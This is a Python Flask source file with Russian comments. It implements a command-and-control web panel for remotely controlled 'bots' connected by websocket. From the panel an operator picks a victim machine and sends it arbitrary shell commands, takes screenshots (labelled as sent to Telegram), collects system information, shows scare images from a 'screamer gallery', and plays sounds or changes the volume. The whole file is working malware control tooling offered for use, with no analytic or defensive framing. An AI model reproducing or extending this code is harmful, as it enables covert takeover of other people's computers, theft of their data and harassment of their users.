import time
import threading
import os
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from flask_sock import Sock

# --- Инициализация ---
app = Flask(__name__)
sock = Sock(app)

# --- Глобальные хранилища данных ---
bots, ws_map, command_results, volume_levels, events = {}, {}, {}, {}, {}

# --- Сканирование папок ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
AUDIO_DIR = os.path.join(BASE_DIR, 'audio_files')
IMAGE_DIR = os.path.join(BASE_DIR, 'image_files')
os.makedirs(AUDIO_DIR, exist_ok=True)
os.makedirs(IMAGE_DIR, exist_ok=True)
audio_files = sorted([f for f in os.listdir(AUDIO_DIR) if os.path.isfile(os.path.join(AUDIO_DIR, f))])
image_files = sorted([f for f in os.listdir(IMAGE_DIR) if os.path.isfile(os.path.join(IMAGE_DIR, f))])

# --- HTML-шаблон с новой кнопкой ---
HTML_TEMPLATE = """
<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
<style>{% raw %}
    body{font-family:monospace;background-color:#1a1a1a;color:#0f0; margin: 0; padding: 20px;} .container{width:95%; max-width: 1200px; margin:auto;} h1,h2,h3{text-align:center; border-bottom: 1px solid #0f0; padding-bottom: 10px;} .control-block{margin-top:20px;padding:15px;border:1px solid #0f0; border-radius: 5px;} select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;box-sizing: border-box;} button{background-color:#0f0;color:#1a1a1a;padding:10px 15px;border:none;cursor:pointer;margin-right:10px; margin-top: 5px; transition: background-color 0.2s;} button:hover{background-color:#0c0;} pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;min-height:50px;max-height: 300px; overflow-y: auto;} input[type="range"]{width: 80%; vertical-align: middle;} output{padding-left:10px;} .media-gallery { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; max-height: 400px; overflow-y: auto; padding: 10px; background-color: #000;} .media-gallery img { width: 120px; height: 120px; object-fit: cover; border: 2px solid #0f0; cursor: pointer; transition: transform 0.2s, border-color 0.2s; } .media-gallery img:hover { transform: scale(1.1); border-color: #ff0; } .audio-list { display: flex; flex-direction: column; gap: 8px; max-height: 250px; overflow-y: auto; padding-right: 10px;} .audio-item { background-color: #2a2a2a; padding: 10px; cursor: pointer; border-left: 4px solid #0f0; transition: background-color 0.2s; } .audio-item:hover { background-color: #444; }
{% endraw %}</style>
</head><body onload="initializePanel()">
<div class="container"><h1>Панель управления v9 - Инфо</h1><h2>Активные боты: {{ bots|length }}</h2>
{% if bots %}
    <div class="control-block"><h3>Цель</h3><select id="main_bot_select" onchange="getCurrentVolume()"></select></div>
    <div class="control-block"><h3>Галерея скримеров</h3><div class="media-gallery" id="image_gallery"></div></div>
    <div class="control-block"><h3>Фонотека</h3><div class="audio-list" id="audio_list"></div></div>
    <div class="control-block"><h3>Выполнение команд</h3><input type="text" id="command_input" placeholder="Введите команду..."><button onclick="sendShellCommand('command_input')">Отправить</button></div>
    <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br><button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>

    <!-- ИЗМЕНЕННЫЙ БЛОК -->
    <div class="control-block"><h3>Специальные команды</h3>
        <button onclick="sendShellCommand('sysinfo')">Получить инфо о системе</button>
        <button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button>
    </div>

    <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>
{% else %}<p>Нет активных ботов.</p>{% endif %}
</div>
<script>
    const BOTS = {{ bots.keys()|list|tojson }}; const IMAGE_FILES = {{ image_files|tojson }}; const AUDIO_FILES = {{ audio_files|tojson }};
    const mainBotSelect = document.getElementById('main_bot_select'); const imageGallery = document.getElementById('image_gallery'); const audioList = document.getElementById('audio_list'); const volumeSlider = document.getElementById('volume_slider'); const volumeOutput = document.getElementById('volume_output'); const resultOutput = document.getElementById('result_output_pre');
    function initializePanel() { if (!mainBotSelect) return; BOTS.forEach(bot => { let opt = document.createElement('option'); opt.value = bot; opt.innerHTML = bot; mainBotSelect.appendChild(opt); }); IMAGE_FILES.forEach(f => { let img = document.createElement('img'); img.src = `/files/image/${f}`; img.title = f; img.onclick = () => sendFileCommand('showimage', f); imageGallery.appendChild(img); }); AUDIO_FILES.forEach(f => { let div = document.createElement('div'); div.className = 'audio-item'; div.textContent = f; div.onclick = () => sendFileCommand('playsound', f); audioList.appendChild(div); }); mainBotSelect.dispatchEvent(new Event('change')); }
    if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });
    async function sendCommand(endpoint, body) { const botId = mainBotSelect.value; if (!botId) return; body.bot_id = botId; return fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); }
    async function sendControlCommand(command) { sendCommand('/api/control', { command: command }); }async function sendFileCommand(command_type, filename) { const full_command = `${command_type} ${filename}`; sendCommand('/api/control', { command: full_command }); }
    // ИЗМЕНЕНАЯ ФУНКЦИЯ ДЛЯ УНИВЕРСАЛЬНОСТИ
    async function sendShellCommand(source) {
        let command;
        if (source === 'command_input') { command = document.getElementById('command_input').value; }
        else { command = source; } // Если источник - не поле ввода, значит это сама команда (например, 'sysinfo')
        if (!command) return; resultOutput.textContent = 'Выполнение...'; 
        try { const response = await sendCommand('/api/shell_command', { command: command }); const data = await response.json(); resultOutput.textContent = data.status === 'ok' ? data.result : `Ошибка: ${data.message}`; } catch (error) { resultOutput.textContent = `Сетевая ошибка: ${error}`; }
    }
    async function getCurrentVolume() { try { const response = await sendCommand('/api/get_volume', {}); const data = await response.json(); if (data.status === 'ok') { volumeSlider.value = data.volume; volumeOutput.value = `${data.volume}%`; } } catch (error) { console.error('Error getting volume:', error); } }
</script>
</body></html>
"""

# --- Бэкенд-часть (без изменений) ---
@app.route('/files/<folder>/<filename>')
def serve_files(folder, filename): directory = AUDIO_DIR if folder == 'audio' else IMAGE_DIR if folder == 'image' else None; return send_from_directory(directory, filename) if directory else ("Not Found", 404)
@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE, bots=bots, audio_files=audio_files, image_files=image_files)
@app.route('/api/shell_command', methods=['POST'])
def api_shell_command():
    data = request.get_json(); bot_id, cmd = data.get('bot_id'), data.get('command')
    if not (bot_id and cmd and bot_id in bots): return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400
    try:
        ws = bots[bot_id];
        if bot_id in command_results: del command_results[bot_id]
        ws.send(cmd)
        for _ in range(100): # Увеличим таймаут до 10 секунд для сбора инфы
            if bot_id in command_results: return jsonify({'status': 'ok', 'result': command_results.pop(bot_id)})
            time.sleep(0.1)
        return jsonify({'status': 'error', 'message': 'Бот не ответил за 10 секунд.'}), 408
    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
@app.route('/api/control', methods=['POST'])
def api_control():
    data = request.get_json(); bot_id, cmd = data.get('bot_id'), data.get('command')
    if not (bot_id and cmd and bot_id in bots): return jsonify({'status': 'error', 'message': 'Неверный запрос или бот не найден'}), 400
    try: bots[bot_id].send(cmd); return jsonify({'status': 'ok'})
    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
@app.route('/api/get_volume', methods=['POST'])
def api_get_volume():
    bot_id = request.json.get('bot_id')
    if not (bot_id and bot_id in bots): return jsonify({'status': 'not_found'}), 404
    try:
        events[bot_id] = threading.Event(); bots[bot_id].send('getvolume')
        if events[bot_id].wait(timeout=3): return jsonify({'status': 'ok', 'volume': volume_levels.get(bot_id, 50)})
        else: return jsonify({'status': 'timeout'}), 408
    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
@sock.route('/ws')
def websocket_handler(ws):
    bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
    bots[bot_ip] = ws; ws_map[ws] = bot_ip; print(f"[+] Новый бот: {bot_ip}")
    try:
        while True:
            result = ws.receive(); current_bot_ip = ws_map.get(ws)
            if not current_bot_ip: continue
            if result.startswith('VOL_LEVEL:'):
                level_str = result.split(':')[1]
                if level_str.isdigit():
                    volume_levels[current_bot_ip] = int(level_str)
                    if current_bot_ip in events and not events[current_bot_ip].is_set(): events[current_bot_ip].set()
            else: command_results[current_bot_ip] = result
    except Exception:
        dead_bot_ip = ws_map.pop(ws, None)
        if dead_bot_ip:
            for d in [bots, volume_levels, command_results, events]:
                if dead_bot_ip in d: del d[dead_bot_ip]
        print(f"[-] Бот {dead_bot_ip or 'unknown'} отвалился.")
if __name__ == '__main__': print("Этот скрипт не предназначен для прямого запуска.")
